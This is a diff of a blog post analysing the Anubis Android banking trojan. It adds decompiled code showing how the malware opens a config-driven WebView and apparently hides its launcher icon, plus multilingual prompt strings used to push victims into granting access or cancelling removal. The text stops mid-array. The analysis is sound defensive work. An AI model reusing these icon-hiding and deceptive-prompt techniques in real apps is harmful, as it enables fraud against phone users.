@@ -21,7 +21,7 @@ tags: ["reverse-engineering", "android", "malware"]
     - adb
     - frida
     - mobsf
-    - jd-gui
+    - jadx
 
 # Setting things up
 
@@ -164,20 +164,14 @@ here is the result.
 from that, we can conclude that this sample is obfuscated using ProGuard. 
 
 There are few projects that are capable of deobfuscating ProGuard. dex-oracle, simplify
-are two of such projects.
+are two of such projects. However the goal here is not to deobfuscate the class names, variable names, and methods, but to deobfuscate constants and strings
+because without the mapping.txt, there is no way to rename classes, methods and variables things.
 
 ![simplify](/img/anubis/anubis_simplify.png)
 
 simplify get to somewhere but then horribly fails.
 
 ```
-(4 / 7) Executing top level method: Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->onStart()V
-23:43:18.370 WARN  InvokeOp     - org.cf.smalivm.exception.MaxAddressVisitsExceededException: Exceeded max address visits @0 ExecutionNode{signature=Lwocwvy/czyxoxmbauu/slsa/b;->b(Ljava/lang/String;)[B, op=invoke-virtual {r8}, Ljava/lang/String;->length()I, @=0} in Lwocwvy/czyxoxmbauu/slsa/b;->b(Ljava/lang/String;)[B
-23:45:46.813 WARN  InvokeOp     - org.cf.smalivm.exception.MaxAddressVisitsExceededException: Exceeded max address visits @0 ExecutionNode{signature=Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a;->b([B)[B, op=array-length r0, r7, @=0} in Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a;->b([B)[B
-23:45:46.923 WARN  InvokeOp     - org.cf.smalivm.exception.MaxAddressVisitsExceededException: Exceeded max address visits @0 ExecutionNode{signature=Lwocwvy/czyxoxmbauu/slsa/b;->b(Ljava/lang/String;)[B, op=invoke-virtual {r8}, Ljava/lang/String;->length()I, @=0} in Lwocwvy/czyxoxmbauu/slsa/b;->b(Ljava/lang/String;)[B
-23:48:14.474 WARN  InvokeOp     - org.cf.smalivm.exception.MaxAddressVisitsExceededException: Exceeded max address visits @0 ExecutionNode{signature=Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a;->b([B)[B, op=array-length r0, r7, @=0} in Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a;->b([B)[B
-23:48:15.842 WARN  ExecutionContext - org.cf.smalivm.exception.MaxAddressVisitsExceededException: Exceeded max address visits @0 ExecutionNode{signature=Landroid/util/StateSet;-><clinit>()V, op=const/4 r13, 0x1, @=0} in Landroid/util/StateSet;-><clinit>()V
-23:48:15.842 ERROR NodeExecutor - ExecutionNode{signature=Landroid/util/StateSet;->get(I)[I, op=array-length r0, r0, @=2} unhandled virtual exception: 
 java.lang.NullPointerException: Attempt to get length of null array
 	at java.base/jdk.internal.reflect.GeneratedConstructorAccessor6.newInstance(Unknown Source)
 	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
@@ -216,7 +210,7 @@ java.lang.NullPointerException: Attempt to get length of null array
 	at org.cf.simplify.Main.main(Main.java:14)
 ```
 
-I tried running dex-oracle and it failed too.
+I tried running dex-oracle and it failed too. 
 
 ## Behavioral analysis 
 
@@ -261,6 +255,156 @@ Output written to anubis-enjarify.jar
 136 classes translated successfully, 0 classes had errors
 rxOred-aspiree :: Analysis/android/anubis » 
 ```
-Then, using the jd-gui decompiler, we can analyse the code.
+Then, using jadx, we can analyse the code. To make it easy, I did some analysis and found `MainActivity`. 
 
 
+```java
+/* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.myvbo */
+public class MainActivity extends Activity {
+
+    [... some variables]
+    
+    /* renamed from: d */
+    BankingApps banking_apps = new BankingApps();
+
+    /* access modifiers changed from: protected */
+    public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        if (!this.consts.f388o || Build.VERSION.SDK_INT < 19) {
+            startService(new Intent(this, jtfxlnc.class));
+        } else {
+            WebView webView = new WebView(this);
+            webView.getSettings().setJavaScriptEnabled(true);
+            webView.loadUrl(this.consts.f389p);
+            setContentView(webView);
+        } 
+        
+        [... more code]
+```
+
+In the MainActivity, it declares some variables, including `banking_apps` of type `class BankingApps`. (which i reverse engineered and renamed before coming to this hehe :3).
+
+onCreate method then check whether if `consts.f388o` is false (which is initially false, and defined in `Constants` class) or `Build.VERSION.SDK_INT` is less than 19.
+
+if yes, it creates the service `jtfxlnc`, else (if const.f388o is true or build sdk version >= 19),
+it creates a `WebView`, enable javascript and load the url specified in `consts.f389p`. then it 
+sets the content view to the web view.
+
+what this basically does is loads up a web page in a WebView layout as a part of the activity.
+
+```java
+public class Constants {
+    [... more constants]
+
+    /* renamed from: o */
+    public boolean f388o = false;
+
+    /* renamed from: p */
+    public String url_image = "<urlImage>";
+
+    [... more constants]
+}
+```
+Above snippet shows the constants
+
+
+Then we can see an interesting piece of code in the MainActivity after the if else statement.  
+
+```java
+            getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);
+```
+
+ 
+
+
+```java
+/* renamed from: wocwvy.czyxoxmbauu.slsa.a */
+public class GetBankingApps {
+
+    /* renamed from: h */
+    public static final String[] f321h = "[az]aktivləşdirmək::[sq]aktivizoni::[am]የሚሰጡዋቸውን::[en]activate::[ar]تفعيل::[hy]ակտիվացնել::[af]aktiveer::[eu]aktibatu::[ba]актив::[be]актываваць::[bn]সক্রিয়::[my]သက်ဝင်::[bg]активира::[bs]aktiviraj::[cy]activate::[hu]aktiválja::[vi]kích hoạt::[ht]aktive::[gl]activar::[nl]activeren::[mrj]активировать::[el]ενεργοποίηση::[ka]გააქტიურება::[gu]સક્રિય::[da]aktivere::[he]הפעל::[yi]אַקטאַווייט::[id]mengaktifkan::[ga]gníomhachtaigh::[is]virkja::[es]activar::[it]attivare::[kk]іске қосу::[kn]ಸಕ್ರಿಯಗೊಳಿಸಿ::[ca]activar::[ky]активировать::[zh]激活::[ko]활성화::[xh]sebenzisa::[km]ធ្វើឱ្យ::[lo]ກະຕຸ້ນ::[la]eu::[lv]aktivizēt::[lt]įjungti::[lb]aktivéieren::[mk]активирајте::[mg]mampihetsika::[ms]mengaktifkan::[ml]സജീവമാക്കുക::[mt]jattiva::[mi]whakahohe::[mr]सक्रिय::[mhr]чӱкташ::[mn]идэвхжүүлэх::[de]aktivieren::[ne]सक्रिय::[no]aktiver::[pa]ਸਰਗਰਮ::[pap]primi::[fa]فعال::[pl]aktywować::[pt]activar::[ro]activa::[ru]активировать::[ceb]activate::[sr]активирај::[si]ක්රියාත්මක::[sk]aktivácia::[sl]vključi::[sw]kuamsha::[su]aktipkeun::[tl]i-activate::[tg]фаъол::[th]เปิดใช้งาน::[ta]செயல்படுத்த::[tt]активировать::[te]సక్రియం::[tr]etkinleştirmek::[udm]активировать::[uz]faollashtirish::[uk]активувати::[ur]چالو::[fi]aktivoi::[fr]activer::[hi]सक्रिय::[hr]aktivirati::[cs]aktivovat::[sv]aktivera::[gd]gnìomhaich::[eo]aktivigi::[et]aktiveerige::[jv]ngaktifake::[ja]活性化".split("::");
+
+    /* renamed from: i */
+    public static final String[] f322i = "[az]Yandırmaq üçün giriş::[sq]Mundësimi i aksesit për::[am]ደረጃ መድረስ ደረጃ አልተሰጠውም::[en]Enable access for::[ar]تمكين الوصول إلى::[hy]Միացնել մուտք::[af]In staat stel om toegang vir::[eu]Gaitu sarbidea::[ba]Эсенә инеү өсөн::[be]Уключыце доступ для::[bn]এক্সেস সক্রিয় জন্য::[my]ဖစ္ရပ္တည္ႏေ::[bg]Включете достъп за::[bs]Omogućiti pristup::[cy]Galluogi mynediad ar gyfer::[hu]Hozzáférés engedélyezése a::[vi]Cho phép truy cập cho::[ht]Pèmèt aksè pou::[gl]Posibilitar o acceso para::[nl]Toegang voor::[mrj]Пыртен кердеш::[el]Ενεργοποιήστε την πρόσβαση για::[ka]საშუალებას დაშვება::[gu]સક્રિય ઍક્સેસ માટે::[da]Aktiver adgang til::[he]לאפשר גישה::[yi]געבן צוטריט פֿאַר::[id]Mengaktifkan akses untuk::[ga]A chumas rochtain a fháil ar do::[is]Virkja aðgang::[es]Habilitar el acceso para::[it]Abilitare l'accesso per::[kk]Қосыңыз қол жеткізу үшін::[kn]ಸಕ್ರಿಯಗೊಳಿಸಿ ಪ್ರವೇಶ::[ca]Permetre l'accés per::[ky]Включите кирүү үчүн::[zh]使访问::[ko]활성화에 대한 액세스::[xh]Yenza ukufikelela kuba::[km]បើកការចូលដំណើរសម្រាប់::[lo]ເຮັດໃຫ້ສາມາດເຂົ້າເຖິງສໍາລັບ::[la]Morbi accessum ad::[lv]Ieslēdziet piekļuve::[lt]Įjunkite galimybė::[lb]Veröffentlechen Si den Accès fir::[mk]Им овозможи пристап за::[mg]Alefaso ny fidirana ho::[ms]Akses untuk membolehkan::[ml]Enable access വേണ്ടി::[mt]Tippermetti l-aċċess għall -::[mi]Taea ai te whai wāhi mō te::[mr]सक्षम प्रवेश::[mhr]Пураш пурташ::[mn]Идэвхжүүлэх хандах::[de]Schalten Sie den Zugang für::[ne]पहुँच सक्षम पार्नुहोस् ��ागि::[no]Tillat tilgang for::[pa]ਯੋਗ ਲਈ ਪਹੁੰਚ::[pap]Abilidat di aceso na::[fa]فعال کردن دسترسی برای::[pl]Włącz dostęp do::[pt]Habilite o acesso para::[ro]Activați acces pentru::[ru]Включите доступ для::[ceb]Paghimo access alang sa::[sr]Укључите приступ за::[si]සක්රීය ප්රවේශය සඳහා::[sk]Povoliť prístup pre::[sl]Omogočanje dostopa za::[sw]Kuwawezesha access kwa ajili ya::[su]Ngaktipkeun aksés pikeun::[tl]Paganahin ang pag-access para sa::[tg]Рӯй оид ба дастрасӣ ба::[th]เปิดใช้งานสำหรับเข้าถึง::[ta]இயக்கு அனுமதி::[tt]Включите керү өчен::[te]ఎనేబుల్ యాక్సెస్ కోసం::[tr]Açın ve erişim için::[udm]Гожтоно кариськи понна::[uz]Uchun kirish imkonini beradi::[uk]Увімкніть доступ для::[ur]قابل رسائی کے لئے::[fi]Mahdollistaa pääsyn::[fr]Activer l'accès pour::[hi]पहुँच सक्षम करें के लिए::[hr]Uključite pristup za::[cs]Povolte přístup pro::[sv]Aktivera åtkomst för::[gd]Cuir cothrom airson::[eo]Ebligi aliron por::[et]Lülitage juurdepääs::[jv]Ngaktifake akses kanggo::[ja]アクセスのための".split("::");
+
+    /* renamed from: j */
+    public static final String[] f323j = "[az]İzin ver::[sq]Të lejojë::[am]የሚሰጡዋቸውን::[en]Allow::[ar]تسمح::[hy]Լուծել::[af]Laat::[eu]Baimendu::[ba]Рөхсәт::[be]Дазволіць::[bn]অনুমতি::[my]ခွင့်ပြု::[bg]Оставя се::[bs]Dozvoliti::[cy]Caniatáu::[hu]Lehetővé teszi,::[vi]Cho phép::[ht]Pèmèt::[gl]Permitir::[nl]Toestaan::[mrj]Разрешӓйӹ::[el]Επιτρέπεται::[ka]საშუალებას::[gu]પરવાનગી આપે છે::[da]Tillad::[he]לאפשר::[yi]לאָזן::[id]Memungkinkan::[ga]Cheadú::[is]Leyfa::[es]Permitir::[it]Consentire::[kk]Рұқсат етілсін::[kn]ಅವಕಾಶ::[ca]Permetre::[ky]Уруксат::[zh]允许::[ko]용::[xh]Vumela::[km]អនុញ្ញាត::[lo]ອະນຸຍາດ::[la]Sino::[lv]Atļaut::[lt]Leisti::[lb]Zulassen::[mk]Дозволете::[mg]Mamela::[ms]Membenarkan::[ml]അനുവദിക്കുക::[mt]Tippermetti::[mi]Tukua::[mr]परवानगी::[mhr]Кӧнеда::[mn]Зөвшөөрөх::[de]Zulassen::[ne]अनुमति::[no]La::[pa]ਸਹਾਇਕ ਹੈ::[pap]Permití::[fa]اجازه می دهد::[pl]Pozwól::[pt]Permitir::[ro]Permite::[ru]Разрешить::[ceb]Pagtugot::[sr]Дозволи::[si]ඉඩ::[sk]Povoliť::[sl]Dovolite,::[sw]Kuruhusu::[su]Ngidinan::[tl]Payagan ang mga::[tg]Иҷозат::[th]อนุญาต::[ta]அனுமதிக்க::[tt]Игъланнары::[te]అనుమతిస్తుంది.::[tr]İzin ver::[udm]Разрешить::[uz]Ruxsat::[uk]Дозволити::[ur]کی اجازت::[fi]Salli::[fr]Autoriser::[hi]की अनुमति::[hr]Dopusti::[cs]Povolit::[sv]Tillåta::[gd]Ceadaich::[eo]Permesi::[et]Luba::[jv]Ngidini::[ja]許可".split("::");
+
+    /* renamed from: k */
+    public static final String[] f324k = "[az]Bəli::[sq]Po::[am]አዎ::[en]Yes::[ar]نعم::[hy]Այո::[af]Ja::[eu]Bai::[ba]Д::[be]Ды::[bn]হ্যাঁ::[my]ဟုတ်ကဲ့::[bg]Да::[bs]- ::[cy]Ie::[hu]Igen::[vi]Yes::[ht]Wi::[gl]Si::[nl]Ja::[mrj]Мане::[el]Ναι::[ka]დიახ::[gu]હા::[da]Ja::[he]כן::[yi]יא::[id]Ya::[ga]Tá::[is]Já::[es]Sí::[it]Sì::[kk]Иә::[kn]ಹೌದು::[ca]Sí::[ky]Ооба::[zh]是的::[ko]네::[xh]Ewe::[km]បាទ::[lo]ແມ່ນແລ້ວ::[la]Etiam::[lv]Jā::[lt]Taip::[lb]Jo::[mk]Yes::[mg]Eny::[ms]Ya::[ml]അതെ::[mt]Iva::[mi]Ae::[mr]होय::[mhr]Да::[mn]Тийм ээ::[de]Ja::[ne]हो::[no]Ja::[pa]ਜੀ::[pap]Sí::[fa]بله::[pl]Tak::[pt]Sim::[ro]Da::[ru]Да::[ceb]Oo::[sr]Да::[si]ඔව්::[sk]Áno::[sl]Da,::[sw]Ndiyo::[su]Enya::[tl]Oo::[tg]Ҳа::[th]ใช่แล้ว::[ta]ஆமாம்::[tt]Әйе::[te]అవును::[tr]Evet::[udm]Мед::[uz]Ha::[uk]Так::[ur]جی ہاں::[fi]Kyllä::[fr]Oui::[hi]हाँ::[hr]Da::[cs]Ano::[sv]Ja::[gd]Yes::[eo]Jes::[et]Jah::[jv]Ya::[ja]あり".split("::");
+
+    /* renamed from: l */
+    public static final String[] f325l = "[az]sil::[sq]uninstall::[am].::[en]uninstall::[ar]إلغاء::[hy]հեռացնել::[af]verwyder::[eu]desinstalatu::[ba]бөтөрөп::[be]выдаліць::[bn]আনইনস্টল::[my]ဖယ်ရှား::[bg]изтриете::[bs]deinstaliranje::[cy]uninstall::[hu]uninstall::[vi]rõ ràng::[ht]désinstaller::[gl]instrucións para::[nl]verwijderen::[mrj]удалена::[el]απεγκατάσταση::[ka]uninstall::[gu]અનઇન્સ્ટોલ કરો::[da]afinstaller::[he]הסרת התקנה::[yi]נעם אַוועק::[id]uninstall::[ga]treoracha::[is]flutningur::[es]desinstalar::[it]disinstallare::[kk]жою::[kn]ಅಸ್ಥಾಪಿಸು::[ca]desinstal · lar::[ky]таштоо::[zh]卸载::[ko]제거::[xh]imizekelo::[km]លុប::[lo]ຖ::[la]uninstall::[lv]atinstalēt::[lt]pašalinti::[lb]deinstallieren::[mk]деинсталирање::[mg]fanesorana::[ms]pemasangan::[ml]അൺഇൻസ്റ്റാൾ::[mt]istruzzjonijiet::[mi]wetetāuta::[mr]विस्थापित::[mhr]кораҥдаш::[mn]устгах::[de]deinstallieren::[ne]स्थापना रद्द::[no]avinstaller::[pa]ਅਣ::[pap]dental::[fa]حذف::[pl]usunąć::[pt]desinstalação::[ro]dezinstalare::[ru]удалить::[ceb]uninstall::[sr]уклонити::[si]අස්ථාපනය කරන්න::[sk]odinštalovať::[sl]odstrani::[sw]kuondolewa::[su]uninstall::[tl]i-uninstall ang mga::[tg]чӣ тавр ба хориҷ::[th]ถอนการติดตั้ง::[ta]மென்பொருளை நீக்க::[tt]бетерә::[te]అన్ఇన్స్టాల్::[tr]Kaldır::[udm]палэнтыны::[uz]adware virus olib tashlash uchun::[uk]видалити::[ur]انسٹال::[fi]uninstall::[fr]désinstaller::[hi]स्थापना रद्द करें::[hr]izbrisati::[cs]odinstalovat::[sv]avinstallera::[gd]dì-stàlaich::[eo]uninstall::[et]uninstall::[jv]busak instal::[ja]アンインストール".split("::");
+
+    /* renamed from: m */
+    public static final String[] f326m = "[az]sil::[sq]për të hequr::[am]ማስወገድ::[en]to remove::[ar]لإزالة::[hy]հեռացնել::[af]te verwyder::[eu]kendu::[ba]бөтөрөп::[be]выдаліць::[bn]মুছে ফেলার জন্য::[my]ဖယ်ရှားရန်::[bg]изтриете::[bs]da ukloni::[cy]i gael gwared ar::[hu]eltávolítani::[vi]để loại bỏ::[ht]pou retire::[gl]para eliminar::[nl]verwijderen::[mrj]удалена::[el]διαγραφή::[ka]უნდა ამოიღონ::[gu]દૂર કરવા માટે::[da]for at fjerne::[he]כדי להסיר::[yi]צו באַזייַטיקן::[id]untuk menghapus::[ga]a bhaint::[is]til að fjarlægja::[es]eliminar::[it]rimuovere::[kk]жою::[kn]ತೆಗೆದುಹಾಕಲು::[ca]per eliminar::[ky]таштоо::[zh]删除::[ko]를 제거::[xh]ukususa::[km]ដើម្បីយកចេញ::[lo]ເພື່ອເອົາ::[la]ad tollendam::[lv]dzēst::[lt]pašalinti::[lb]ewechhuelen::[mk]за да се отстрани::[mg]mba hanesorana::[ms]untuk mengeluarkan::[ml]നീക്കം::[mt]biex tneħħi::[mi]ki te tango::[mr]काढा::[mhr]кораҥдаш::[mn]устгах::[de]entfernen::[ne]हटाउन::[no]for å fjerne::[pa]ਨੂੰ ਹਟਾਉਣ ਲਈ::[pap]kita::[fa]برای حذف::[pl]usunąć::[pt]remover::[ro]elimina::[ru]удалить::[ceb]aron sa pagpapahawa::[sr]уклонити::[si]ඉවත් කිරීමට::[sk]odstrániť::[sl]odstrani::[sw]kuondoa::[su]pikeun miceun::[tl]upang alisin::[tg]чӣ тавр ба хориҷ::[th]เพื่อลบ::[ta]நீக்க::[tt]бетерә::[te]తొలగించడానికి::[tr]sil::[udm]палэнтыны::[uz]olib tashlash uchun::[uk]видалити::[ur]کو ہٹانے کے لئے::[fi]poistaa::[fr]supprimer::[hi]को दूर करने के लिए::[hr]izbrisati::[cs]odstranit::[sv]för att ta bort::[gd]a thoirt air falbh::[eo]forigi::[et]kustuta::[jv]kanggo mbusak::[ja]除".split("::");
+
+    /* renamed from: n */
+    public static final String[] f327n = "[az]yandırmaq::[sq]përfshijnë::[am]ማካተት::[en]include::[ar]وتشمل::[hy]միացնել::[af]sluit::[eu]besteak beste::[ba]индереү::[be]ўключыць::[bn]অন্তর্ভুক্ত::[my]င္သည္။::[bg]включи::[bs]uključuju::[cy]yn cynnwys::[hu]tartalmazza::[vi]bao gồm::[ht]gen ladan yo::[gl]inclúen::[nl]zijn::[mrj]чӱктен::[el]ενεργοποίηση::[ka]მოიცავს::[gu]સમાવેશ થાય છે::[da]omfatter::[he]כוללים::[yi]אַרייַננעמען::[id]termasuk::[ga]san áireamh::[is]fela::[es]incluir::[it]includere::[kk]қосу::[kn]ಸೇರಿವೆ::[ca]incloure::[ky]киргизүүгө::[zh]包括::[ko]함::[xh]quka::[km]រួមមាន::[lo]ປະກອບ::[la]etiam::[lv]iekļaut::[lt]įjungti::[lb]einschalten::[mk]вклучуваат::[mg]ahitana::[ms]termasuk::[ml]include::[mt]jinkludu::[mi]ngā::[mr]यांचा समावेश आहे::[mhr]включатлаш::[mn]оруулах::[de]einschalten::[ne]समावेश::[no]inkluderer::[pa]ਵਿੱਚ ਸ਼ਾਮਲ ਹਨ::[pap]inclui::[fa]عبارتند از:::[pl]włączyć::[pt]incluir::[ro]include::[ru]включить::[ceb]naglakip sa::[sr]укључите::[si]ඇතුළත්::[sk]patrí::[sl]vključujejo::[sw]ni pamoja na::[su]antarana::[tl]isama::[tg]даргиронидани::[th]รวม::[ta]அடங்கும்::[tt]кертергә::[te]ఉన్నాయి.::[tr]dahil::[udm]гожтыны::[uz]o'z ichiga oladi::[uk]включити::[ur]شامل ہیں::[fi]sisältää::[fr]activer::[hi]शामिल हैं::[hr]uključiti::[cs]zahrnout::[sv]inkluderar::[gd]gabhail a-steach::[eo]inkluzivas::[et]sisse::[jv]kalebu::[ja]など".split("::");
+
+    /* renamed from: o */
+    public static final String[] f328o = ":[az]indi başlamaq::[sq]filloni tani::[am]አዳዲስ::[en]start now::[ar]تبدأ الآن::[hy]հիմա սկսել::[af]nou begin::[eu]orain hasi::[ba]хәҙер башланы.::[be]пачаць цяпер::[bn]এখন শুরু::[my]ယခုစတင်::[bg]започнете сега,::[bs]sada početi::[cy]ddechrau yn awr::[hu]indítás most::[vi]bắt đầu ngay bây giờ::[ht]kòmanse kounye a::[gl]comezar agora::[nl]start nu::[mrj]кӹзӹт тӹнгӓлӹн.::[el]να αρχίσει τώρα::[ka]დაწყება ახლავე::[gu]હવે શરૂ કરો::[da]start nu::[he]להתחיל עכשיו::[yi]אָנהייב איצט::[id]mulai sekarang::[ga]tús a chur anois::[is]byrjar nú::[es]empezar ahora::[it]iniziare ora::[kk]қазір бастау керек::[kn]ಈಗ ಪ್ರಾರಂಭಿಸಿ::[ca]comença ara::[ky]азыр баштоо::[zh]从现在开始::[ko]지금 시작::[xh]qala ngoku::[km]ចាប់ផ្តើមឥឡូវនេះ::[lo]ເລີ່ມຕົ້ນການປັດຈຸບັນ::[la]tincidunt nunc::[lv]sākt tagad::[lt]pradėti dabar::[lb]elo lass::[mk]почнете сега::[mg]manomboka izao::[ms]mulai sekarang::[ml]start now::[mt]ibda issa::[mi]tīmata i teie nei::[mr]आता प्रारंभ करा::[mhr]кызыт тӱҥалын::[mn]одоо эхлэх::[de]starten Sie jetzt::[ne]अब सुरु::[no]start nå::[pa]ਹੁਣ ਸ਼ੁਰੂ::[pap]kuminsá awor::[fa]در حال حاضر شروع::[pl]zacząć teraz::[pt]começar agora::[ro]începe acum::[ru]начать сейчас::[ceb]sugdi karon::[sr]почети сада::[si]දැන් ආරම්භ::[sk]začnite teraz::[sl]začni zdaj::[sw]kuanza sasa::[su]ngamimitian ayeuna::[tl]simulan ngayon::[tg]оғоз ҳоло::[th]เริ่มตอนนี้::[ta]இப்போது தொடங்க::[tt]башларга хәзер::[te]start now::[tr]şimdi başlayın::[udm]али кутскемын::[uz]hozir boshlash::[uk]почати зараз::[ur]اب شروع::[fi]aloita nyt::[fr]commencer dès maintenant::[hi]अब शुरू करो::[hr]započnite sada::[cs]začněte hned::[sv]börja nu::[gd]tòisich air a-nis::[eo]komenci nun::[et]alusta kohe::[jv]miwiti saiki::[ja]始めないといけない:".split("::");
+
+    /* renamed from: p */
+    public static final String[] f329p = ":[az]başlamaq::[sq]për të filluar::[am]ጋር::[en]to start::[ar]لبدء::[hy]սկսել::[af]om te begin::[eu]hasteko::[ba]башлана::[be]пачаць::[bn]শুরু করার জন্য::[my]စတင်::[bg]започнете::[bs]da počnem::[cy]i ddechrau::[hu]kezdeni::[vi]để bắt đầu::[ht]pou yo kòmanse::[gl]para comezar::[nl]om te beginnen::[mrj]тӹнгӓльӹ::[el]ξεκινήσετε::[ka]უნდა დაიწყოს::[gu]શરૂ કરવા માટે::[da]til at starte::[he]כדי להתחיל::[yi]צו אָנהייבן::[id]untuk memulai::[ga]chun tús a chur::[is]til að byrja::[es]empezar::[it]iniziare::[kk]бастау::[kn]ಆರಂಭಿಸಲು::[ca]per començar::[ky]баштоо::[zh]开始::[ko]을 시작::[xh]ukuqala::[km]ដើម្បីចាប់ផ្តើម::[lo]ເພື່ອເລີ່ມຕົ້ນ::[la]ad satus::[lv]sākt::[lt]pradėti::[lb]starten::[mk]за да започнете::[mg]manomboka::[ms]untuk memulakan::[ml]ആരംഭിക്കുക::[mt]biex tibda::[mi]ki te tīmata::[mr]सुरू करण्यासाठी::[mhr]тӱҥалына::[mn]эхлэх::[de]starten::[ne]सुरु गर्न::[no]for å starte::[pa]ਸ਼ੁਰੂ ਕਰਨ ਲਈ::[pap]kuminsá::[fa]برای شروع::[pl]zacząć::[pt]começar::[ro]începe::[ru]начать::[ceb]sa pagsugod::[sr]почетак::[si]ආරම්භ කිරීමට::[sk]na začiatok::[sl]za začetek::[sw]kuanza::[su]pikeun ngamimitian::[tl]upang simulan ang::[tg]post оянда::[th]ต้องเริ่มต้น::[ta]தொடங்க::[tt]башлау::[te]ప్రారంభం::[tr]başlamak::[udm]кутскиз::[uz]boshlash uchun ::[uk]почати::[ur]شروع کرنے کے لئے::[fi]aloittaa::[fr]commencer::[hi]शुरू करने के लिए::[hr]početak::[cs]začít::[sv]för att börja::[gd]tòiseachadh::[eo]al komenco::[et]alustada::[jv]kanggo miwiti::[ja]を開始:".split("::");
+
+    /* renamed from: q */
+    public static final String[] f330q = ":[az]Sistem işləyir səhv ayırın ::[sq]Sistemi nuk funksionon në mënyrë korrekte, të çaktivizoni ::[am]አዳዲስ ግምገማዎች በትክክል አንድ ::[en]The system does not work correctly, disable ::[ar]النظام لا يعمل بشكل صحيح ، تعطيل ::[hy]Համակարգը աշխատում է, սխալ է, անջատեք ::[af]Die stelsel nie werk nie korrek nie, skakel ::[eu]Sistema ez da behar bezala lan, desgaitu ::[ba]Системалары дөрөҫ эшләргә,  һүндерелә::[be]Сістэма працуе няправільна, адключыце ::[bn]সিস্টেম কাজ করে না, সঠিকভাবে নিষ্ক্রিয় ::[my]အဆိုပါစနစ်ကအလုပ်မလုပ်ပါဘူး၊မှန်မှန်ကန်ကန်ပိတ် ၁၂၃၁၂၃::[bg]Системата работи правилно, изключете ::[bs]Sistem ne radi ispravno, onesposobiti ::[cy]Nid yw'r system yn gweithio yn gywir, analluogi ::[hu]A rendszer nem működik megfelelően, tiltsa le ::[vi]Hệ thống không hoạt động chính xác, vô hiệu hóa ::[ht]Sistèm nan pa travay kòrèkteman, enfim ::[gl]O sistema non funciona correctamente, desactivar ::[nl]Het systeem werkt niet goed, uitschakelen ::[mrj]Самынь системӹм ӹштӹмӓш, отключать ::[el]Το σύστημα δεν λειτουργεί σωστά, απενεργοποιήστε ::[ka]სისტემა არ მუშაობს სწორად, გამორთოთ ::[gu]આ સિસ્ટમ યોગ્ય રીતે કામ કરતી નથી, નિષ્ક્રિય ::[da]Systemet ikke fungerer korrekt, skal du deaktivere ::[he]המערכת לא עובדת כראוי, השבת ::[yi]די סיסטעם טוט ניט אַרבעט ריכטיק, דיסייבאַל ::[id]Sistem tidak bekerja dengan benar, menonaktifkan ::[ga]Ní dhéanann an córas ag obair i gceart, a dhíchumasú ::[is]Kerfið virkar ekki rétt, slökkva ::[es]El sistema no funciona correctamente, deshabilitar ::[it]Il sistema non funziona correttamente, disattivare ::[kk]Жүйесі дұрыс жұмыс істемейді, өшіріңіз ::[kn]ವ್ಯವಸ್ಥೆ ಸರಿಯಾಗಿ ಕೆಲಸ ಮಾಡುವುದಿಲ್ಲ, ನಿಷ್ಕ್ರಿಯಗೊಳಿಸಲು ::[ca]El sistema no funciona correctament, inutilitzar en ::[ky]Тутум туура эмес, отключите ::[zh]该系统不能正常工作，禁止::[ko]이 체계가 제대로 작동하지 않으면 비활성화 ::[xh]Inkqubo kubancedisi ngokuchanekileyo, khubaza ::[km]ប្រព័ន្ធនេះមិនបានធ្វើការយ៉ាងត្រឹមបិទ ១២៣១២៣::[lo]ລະບົບບໍ່ໄດ້ເຮັດວຽກຢ່າງຖືກຕ້ອງ,ປິດການໃຊ້ ໑໒໓໑໒໓::[la]Ratio non opus est, ut recte, disable ::[lv]Sistēma nedarbojas pareizi, atslēgt ::[lt]Sistema neveikia tinkamai, išjunkite ::[lb]D ' system net ordnungsgemäß fonctionnéiert, deaktivieren Si ::[mk]Системот не работи правилно, исклучете ::[mg]Ny rafitra dia tsy miasa araka ny tokony ho izy, mankarary ::[ms]Sistem tidak bekerja dengan betul, melumpuhkan ::[ml]The system does not work correctly, അപ്രാപ്തമാക്കുക ::[mt]Is-sistema ma taħdimx kif suppost, iwaqqaf ::[mi]Ko te pūnaha e kore e mahi i te tika, mono i ::[mr]प्रणाली कार्य करत नाही योग्य अक्षम ::[mhr]Йоҥылыш система пашам ышта, пыштышым ::[mn]Систем ажиллахгүй зөв, идэвхгүй ::[de]Das system nicht ordnungsgemäß funktioniert, deaktivieren Sie ::[ne]The system does not work correctly, अक्षम ::[no]Systemet ikke fungerer på riktig måte, må du deaktivere ::[pa]ਸਿਸਟਮ ਨੂੰ ਕੰਮ ਨਹੀ ਕਰਦਾ ਹੈ, ਠੀਕ ਅਯੋਗ ::[pap]E sistema no ta funciona directamente, desabilidat ::[fa]این سیستم به درستی کار نمی کند با غیر فعال کردن ::[pl]System nie działa prawidłowo, wyłącz ::[pt]O sistema não funcionar corretamente, desative ::[ro]Sistemul nu funcționează corect, dezactiva ::[ru]Система работает неправильно, отключите ::[ceb]Ang sistema sa dili pagtrabaho sa husto nga paagi, nga naghimo og kakulangan sa ::[sr]Систем ради у реду, искључите ::[si]මෙම ක්රමය වැඩ කරන්නේ නැහැ, නිවැරදිව, අක්රීය ::[sk]Systém nefunguje správne, vypnite ::[sl]Sistem ne deluje pravilno, se onemogoči ::[sw]Mfumo haifanyi kazi kwa usahihi, afya ::[su]Sistim teu digawé bener, pareuman ::[tl]Ang sistema ay hindi gumagana nang tama, huwag paganahin ang ::[tg]Системаи кор нодуруст аст, отключите ::[th]ระบบจะไม่ทำงานอย่างถูกต้อปิดการใช้งาน ::[ta]கணினி சரியாக வேலை செய்யாது, முடக்க ::[tt]Система эшли дөрес түгел, отключите ::[te]The system does not work correctly, డిసేబుల్ ::[tr]Sistem düzgün çalışmıyor, devre dışı ::[udm]Неправильно системая ужа, disconnect ::[uz]Tizimi to'g'ri, o'chirish  ishlamaydi ::[uk]Система працює неправильно, вимкніть ::[ur]نظام کام نہیں کرتا ہے ، درست طریقے سے غیر فعال ::[fi]Järjestelmä ei toimi oikein, poista ::[fr]Le système ne fonctionne pas correctement, désactivez ::[hi]सिस्टम ठीक से काम नहीं करता है, निष्क्रिय ::[hr]Sustav radi ispravno, isključite 